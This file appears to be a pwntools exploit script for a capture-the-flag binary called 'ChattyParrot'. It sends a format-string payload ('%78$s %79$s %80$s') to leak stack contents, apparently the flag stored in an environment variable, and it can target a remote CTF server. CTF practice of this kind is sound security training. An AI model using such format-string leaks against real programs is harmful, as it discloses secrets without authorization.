#!/usr/bin/env python3
from pwn import *
elf = ELF("./ChattyParrot")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.mf.grsu.by"
port = 9077

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path],env={"FLAG_VAL":"TEST-TEST-TEST"})
r = start()

#========= exploit here ===================

payload = b"%78$s %79$s %80$s"
r.sendlineafter(b"phrase:",payload)
leaks = r.recvline()
print(leaks)
# LEAKS
